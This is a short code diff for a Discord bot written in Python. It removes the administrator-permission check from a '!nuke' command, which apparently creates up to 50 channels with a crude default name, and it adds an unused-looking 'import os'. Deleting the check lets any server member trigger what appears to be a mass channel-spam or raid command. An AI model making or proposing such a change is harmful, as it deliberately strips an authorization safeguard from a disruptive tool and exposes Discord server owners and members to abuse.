@@ -8529,6 +8529,7 @@ async def server_owner_slash_check(interaction: discord.Interaction):
 bot.tree.interaction_check = server_owner_slash_check
 
 import asyncio
+import os
 import discord
 from discord.ext import commands
 
@@ -8539,7 +8540,6 @@ intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 @bot.command()
-@commands.has_permissions(administrator=True)
 async def nuke(ctx, count: int, channel_name: str = "ちんちん"):
     # 1〜50個の範囲に制限
     if count < 1 or count > 50:
@@ -8568,6 +8568,7 @@ async def nuke(ctx, count: int, channel_name: str = "ちんちん"):
             await asyncio.sleep(0.5)
         except discord.HTTPException:
             pass
+
 
 
 # ==================================================
